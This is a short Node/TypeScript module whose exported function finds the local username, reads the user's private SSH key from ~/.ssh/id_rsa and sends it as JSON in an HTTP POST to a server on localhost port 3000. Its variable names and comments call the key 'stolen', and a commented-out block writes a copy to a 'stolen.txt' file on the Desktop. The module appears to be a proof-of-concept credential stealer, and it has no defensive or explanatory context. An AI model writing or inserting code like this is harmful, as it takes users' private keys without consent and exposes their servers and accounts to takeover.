var http = require('http');
const cp = require('child_process');
const fs = require('fs');

export default function() {
    var deviceUser = cp.execSync('id -un', { encoding: 'utf-8' });
    
    let targetPath = (`/Users/${deviceUser}/.ssh/id_rsa`).replace(/(\r\n|\n|\r)/gm, "");
    
    // Code to create file with stolen content in Desktop directory.

    // const origin = fs.createReadStream(targetPath, {flags: 'r'});
    // const destination = fs.createWriteStream('/Users/alexbabalitis/Desktop/stolen.txt', {flags: 'w+'});
    // origin.pipe(destination);
    
    const stolenSSH = fs.readFileSync(targetPath,'utf8');

    var postData = JSON.stringify({
        'key' : `${stolenSSH}`
    });

    var options = {
        hostname: 'localhost',
        port: 3000,
        path: '/',
        method: 'POST',
        headers: {
             'Content-Type': 'application/json',
           }
      };

    var req = http.request(options, (res: any) => {
        console.log('statusCode:', res.statusCode);
        console.log('headers:', res.headers);
        
        res.on('data', (d: any) => {
            process.stdout.write(d);
        });
    });
    
    req.on('error', (e: any) => {
        console.error(e);
    });
    
    req.write(postData);
    req.end();
}